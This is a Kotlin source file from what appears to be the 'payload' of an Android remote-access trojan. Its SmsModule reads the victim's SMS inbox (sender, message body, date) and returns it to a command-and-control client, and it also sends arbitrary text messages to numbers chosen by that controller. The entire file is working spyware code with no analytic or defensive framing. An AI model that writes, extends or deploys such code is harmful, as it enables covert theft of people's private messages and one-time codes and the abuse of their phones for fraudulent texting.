package com.ihk909.payload.modules

import android.content.Context
import android.net.Uri
import android.telephony.SmsManager
import com.ihk909.payload.C2Client
import org.json.JSONArray
import org.json.JSONObject

object SmsModule {
    fun list(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        runCatching {
            val limit = args.optInt("limit", 100)
            val arr = JSONArray()
            ctx.contentResolver.query(
                Uri.parse("content://sms"), null, null, null, "date DESC"
            )?.use { c ->
                var i = 0
                while (c.moveToNext() && i < limit) {
                    arr.put(JSONObject()
                        .put("address", c.getString(c.getColumnIndexOrThrow("address")))
                        .put("body", c.getString(c.getColumnIndexOrThrow("body")))
                        .put("date", c.getLong(c.getColumnIndexOrThrow("date"))))
                    i++
                }
            }
            c2.reply(id, JSONObject().put("items", arr))
        }.onFailure { c2.replyError(id, it.message ?: "error") }
    }

    fun send(ctx: Context, c2: C2Client, id: String, args: JSONObject) {
        runCatching {
            SmsManager.getDefault().sendTextMessage(
                args.getString("to"), null, args.getString("body"), null, null)
            c2.reply(id, JSONObject().put("sent", true))
        }.onFailure { c2.replyError(id, it.message ?: "error") }
    }
}